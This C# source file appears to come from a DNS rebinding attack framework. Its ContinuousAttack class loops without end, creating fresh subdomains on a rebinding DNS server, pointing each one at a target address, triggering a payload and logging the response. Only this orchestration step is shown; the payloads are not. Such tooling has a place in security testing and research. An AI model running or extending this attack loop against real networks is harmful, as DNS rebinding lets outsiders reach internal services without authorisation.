using System;
using System.Threading.Tasks;

namespace RebindMeta
{
	public class ContinuousAttack
	{

		private readonly RebindDnsServer _dnsServer;
		private readonly RebindWebServer _webServer;
		private readonly PayloadTriggerBase _trigger;
		public ContinuousAttack(RebindDnsServer dnsServer, RebindWebServer webServer, PayloadTriggerBase trigger)
		{
			_dnsServer = dnsServer;
			_webServer = webServer;
			_trigger = trigger;
		}
		public async Task Attack(AttackTarget target)
		{
			// Spin wheels for a while before starting.
			await Task.Delay(1000);

			while (true)
			{
				string hostname = _dnsServer.GetSubdomain($"xss{DateTime.Now.ToFileTime()}zz");

				_webServer.AddRebindTarget(hostname, target.RebindTarget);

				Logger.WriteLine($"Triggering attack");

				string resp = await _trigger.TriggerAsync(hostname, target);

				Logger.WriteLine($"Attack response {resp}");

				await Task.Delay(1);
			}
		}
	}
}
